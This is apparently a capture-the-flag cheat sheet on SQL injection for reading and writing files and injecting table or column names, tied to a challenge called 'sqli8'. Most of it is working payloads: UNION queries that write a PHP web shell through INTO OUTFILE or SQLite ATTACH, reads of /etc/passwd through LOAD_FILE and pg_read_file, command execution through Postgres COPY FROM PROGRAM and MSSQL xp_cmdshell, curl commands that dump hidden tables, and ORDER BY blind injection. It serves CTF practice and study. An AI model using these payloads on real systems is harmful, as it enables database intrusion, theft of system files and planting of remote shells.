# SQLi file read / write & identifier injection

## Identifier injection (table/column name from the request)
**Signs**: "export a report for table X", `/report/<table>`, `?sort=<column>`, `?order=asc`. The UI
shows only some tables — "some rows are kept out". Identifiers can't be parameterised, so they're
often concatenated:
```bash
curl -s $T/report/vault                       # export a table the UI never lists
curl -s $T/reports/vault.csv | grep -o 'flag{[^}]*}'
```
Guess table names: `vault`, `secret(s)`, `flag(s)`, `users`, `admin`, `config`, `keys` or list
`information_schema.tables` through another injection. `ORDER BY` injection → boolean blind via
`ORDER BY (CASE WHEN (<cond>) THEN name ELSE price END)`.

## MySQL/MariaDB with FILE privilege
```sql
-- write (secure_file_priv must allow the dir; file must not exist)
SELECT * FROM vault INTO OUTFILE '/data/public/reports/x.csv'
' UNION SELECT '<?php system($_GET[c]); ?>',2,3 INTO OUTFILE '/var/www/html/s.php'-- -
-- read
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
```
Check: `SELECT @@secure_file_priv`, `SELECT file_priv FROM mysql.user WHERE user=current_user()`.
Write into a folder the web app **serves** (reports/exports/uploads/static) then download it.

## Other DBMS
- Postgres: `COPY (SELECT secret FROM vault) TO '/tmp/x'`; read `pg_read_file('/etc/passwd')`;
  RCE `COPY t FROM PROGRAM 'id'` (superuser).
- SQLite: `ATTACH DATABASE '/var/www/html/s.php' AS s; CREATE TABLE s.p (x TEXT); INSERT INTO s.p VALUES ('<?php system($_GET[c]); ?>');` (needs stacked queries).
- MSSQL: `xp_cmdshell` (sysadmin): `'; EXEC xp_cmdshell 'type C:\flag.txt'--`.

Seen in: `sqli8` (TransferOps: `/report/<table>` → `SELECT * FROM <table> ... INTO OUTFILE
'/data/public/reports/<table>.csv'`, served at `/reports/<file>`).
